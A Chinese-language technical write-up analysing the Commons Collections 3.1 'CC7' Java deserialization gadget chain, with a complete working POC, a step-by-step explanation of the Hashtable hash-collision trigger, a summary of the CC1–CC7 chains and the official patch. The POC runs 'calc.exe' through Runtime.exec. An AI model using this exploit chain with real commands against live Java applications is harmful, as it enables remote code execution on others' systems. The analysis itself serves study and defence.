# 环境搭建

- JDK 1.8
- Commons Collections 3.1

```
<dependencies>
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.1</version>
    </dependency>
</dependencies>
```

# 利用链分析

**利用链**

```
java.util.Hashtable.readObject
java.util.Hashtable.reconstitutionPut
org.apache.commons.collections.map.AbstractMapDecorator.equals
java.util.AbstractMap.equals
org.apache.commons.collections.map.LazyMap.get
org.apache.commons.collections.functors.ChainedTransformer.transform
org.apache.commons.collections.functors.InvokerTransformer.transform
java.lang.reflect.Method.invoke
sun.reflect.DelegatingMethodAccessorImpl.invoke
sun.reflect.NativeMethodAccessorImpl.invoke
sun.reflect.NativeMethodAccessorImpl.invoke0
java.lang.Runtime.exec
```

POC

```
package CC7;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7Payload {
    public static void main(String[] args) throws Exception{
        Transformer[] faketransformers = new Transformer[]{};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"calc.exe"}),
        };

        ChainedTransformer chain = new ChainedTransformer(faketransformers);

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map LazyMap1 = LazyMap.decorate(innerMap1, chain);
        Map LazyMap2 = LazyMap.decorate(innerMap2, chain);

        LazyMap1.put("yy", 1);
        LazyMap2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(LazyMap1, 1);
        hashtable.put(LazyMap2, 2);

        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chain, transformers);

        LazyMap2.remove("yy");
        ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("CC7.bin"));
        os.writeObject(hashtable);

        ObjectInputStream fos = new ObjectInputStream(new FileInputStream("CC7.bin"));
        fos.readObject();
    }
}
```

后半部分链子依然是不变的,重新去找触发LazyMap.get的点

这次是从Hashtable入手,在Hashtable重写的readObject结尾处的for循环调用了reconstitutionPut方法

```
for (; elements > 0; elements--) {
    @SuppressWarnings("unchecked")
        K key = (K)s.readObject();
    @SuppressWarnings("unchecked")
        V value = (V)s.readObject();
    // sync is eliminated for performance
    reconstitutionPut(table, key, value);
}
```

K和V都是从反序列化流里面读出来的,可以通过put方法进行控制

跟进reconstitutionPut方法

![image-20220129103008837](images/1.png)

看到了利用链写的equals方法,但是for循环的循环条件是`e!=null`,这里并不满足,此时的`tab[index]`为空

![image-20220129103138668](images/2.png)

无法进入for循环执行if语句中的equals方法

不过在reconstitutionPut方法结尾会把这次`K`的`hash,key,value`写进`tab[index]`

![image-20220129103216592](images/3.png)

所以如果执行两次reconstitutionPut方法就可以触发equals了

因为在readObject中调用reconstitutionPut方法是用了for循环,所以只要有两个元素即可，对应POC代码

```
Hashtable hashtable = new Hashtable();
hashtable.put(lazyMap1, 1);
hashtable.put(lazyMap2, 2);
```

接着第二次调用reconstitutionPut方法走到if语句

![image-20220129103553537](images/4.png)

要触发equals还需要先满足`e.hash=hash`,hash是这么来的

```
int hash = key.hashCode();
```

调用了key在这里也就是LazyMap的hashCode方法,就是对LazyMap的键进行hash,具体的方法来追溯到HashMap的hashCode了

不过这里有两个特殊的字符串

在java中，`yy`和`zZ`的hash值恰好相等,除此之外，字符串AaAaAa和BBAaBB的hashcode相同

所以我们在实例化LazyMap的时候添加了两个对应hash相同的键名

```
Map LazyMap1 = LazyMap.decorate(innerMap1, chain);
Map LazyMap2 = LazyMap.decorate(innerMap2, chain);

LazyMap1.put("yy", 1);
LazyMap2.put("zZ", 1);
```

回到if语句

```
if ((e.hash == hash) && e.key.equals(key))
```

e.key是第一次的LazyMap1,所以这里调用LazyMap的equals方法,参数是LazyMap2的对象,不过LazyMap并没有equals方法,需要到他父类去寻找

`AbstractMapDecorator.equals`

```
public boolean equals(Object object) {
    if (object == this) {
        return true;
    }
    return map.equals(object);
}
```

因为我们实例化LazyMap的时候map参数是HashMap对象,这里去调用HashMap的equals方法,但是也要到他的父类去寻找

`AbstractMap.equals`

![image-20220129104600090](images/5.png)

m是传入的LazyMap2对象,经过迭代器操作,key变成了`yy`

这里就需要注意了,在POC中删除了yy这个键值

```
LazyMap2.remove("yy");
```

原因是如果不删除yy这个映射的话

第二次调用`reconstitutionPut`的时候就会存在两个key

在执行到这个if语句的时候

![image-20220129105213497](images/6.png)

`m.size()=2，而size()=1`，会进入if直接返回false

![image-20220129105327232](images/7.png)

所以我们需要remove一个key,那至于为什么是`remove("yy")`

因为当我们调用到get方法的时候,此时的key已经是yy了

![image-20220129105503238](images/8.png)

前面在分析到LazyMap的get方法的时候也提到过,

![image-20220129105550173](images/9.png)

要不包含键值对映射才能进入if执行到我们后面的语句,所以这里我刚好就删除了yy的键值对映射进入if执行到了transform方法,触发后面的rce

到了这里和前面的分析就是相同的了就不再赘述了

# 漏洞复现

![image-20220129105731892](images/10.png)

# 写在最后

几个gadget的链大概是由以下几个部分组成

```
CommonsCollections1: AnnotaionInvocationHandler、Proxy、LazyMap、ChainedTransformer、InvokerTransformer

CommonsCollections3: AnnotaionInvocationHandler、Proxy、LazyMap、ChainedTransformer、InstantiateTransformer、TrAXFilter、TemplatesImpl

CommonsCollections2: PriorityQueue、TransformingComparator、InvokerTransformer、TemplatesImpl

CommonsCollections4: PriorityQueue、TransformingComparator、ChainedTransformer、InstantiateTransformer、TrAXFilter、TemplatesImpl

CommonsCollections5: BadAttributeValueExpException、TiedMapEntry、LazyMap、ChainedTransformer、InvokerTransformer

CommonsCoolections6: HashSet、HashMap、TiedMapEntry、LazyMap、ChainedTransformer、InvokerTransfomer

CommonsCollections7: Hashtable、LazyMap、ChainedTransformer、InvokerTransformer
```



```
执行命令的几种方式：
1.ChainedTransformer+InvokerTransformer，比如1、5、6、7
2.ChainedTransformer+InstantiateTransformer+TrAXFilter+TemplatesImpl，比如3、4
2.ChainedTransformer+InvokerTransformer+TemplatesImpl，比如2
```

再底层点来看其实就只有两种方式，InvokerTransformer和TemplatesImpl

从反序列化到命令执行的路径：

```
1.LazyMap，比如1、3、5、6、7
2.PriorityQueue+TransformingComparator，比如2、4
```

而从反序列化到LazyMap.get()这条路径又分为了好几种：

```
1.AnnotationInvocationHandler+Proxy，比如1、3
2.BadAttributeValueExpException+TiedMapEntry，比如5
3.HashSet+HashMap+TiedMapEntry，比如6
4.Hashtable，比如7
```

# 补丁

根据以上的归纳可以发现，其实利用链最底层用来执行命令的方法不过就是Transformer和TemplatesImpl。因为最终目的是执行任意代码，也就是可以执行任意类的任意方法，其实主要就是Transformer的利用，因为TemplatesImpl的几种利用方式不过是结合了不同的Transformer来实现(InvokerTransformer、InstantiateTransformer)。

链的构造主要是通过Map绑定Transformer来实现，或者是PriorityQueue绑定TransformingComparator来实现。

反序列化入口不太一样而且

总的来说，这次漏洞主要还是最底层的Transformer的原因，因此官方的补丁就是在几个Transformer的`writeObject()/readObject()`处增加了一个全局开关，默认是开关开启的，当对这些Transformer进行序列化或者反序列化时，会抛出`UnsupportedOperationException`异常。

```java
Copy//InvokerTransformer
private void writeObject(ObjectOutputStream os) throws IOException {
    FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);
    os.defaultWriteObject();
}
private void readObject(ObjectInputStream is) throws ClassNotFoundException, IOException {
    FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);
    is.defaultReadObject();
}

//FunctorUtils
static void checkUnsafeSerialization(Class clazz) {
    String unsafeSerializableProperty;

    try {
        unsafeSerializableProperty =
            (String) AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return System.getProperty(UNSAFE_SERIALIZABLE_PROPERTY);
                }
            });
    } catch (SecurityException ex) {
        unsafeSerializableProperty = null;
    }

    if (!"true".equalsIgnoreCase(unsafeSerializableProperty)) {
        throw new UnsupportedOperationException(
                "Serialization support for " + clazz.getName() + " is disabled for security reasons. " +
                "To enable it set system property '" + UNSAFE_SERIALIZABLE_PROPERTY + "' to 'true', " +
                "but you must ensure that your application does not de-serialize objects from untrusted sources.");
    }}
```

参考链接

https://www.cnblogs.com/litlife/p/12571787.html#commonscollections7

https://xz.aliyun.com/t/10457#toc-12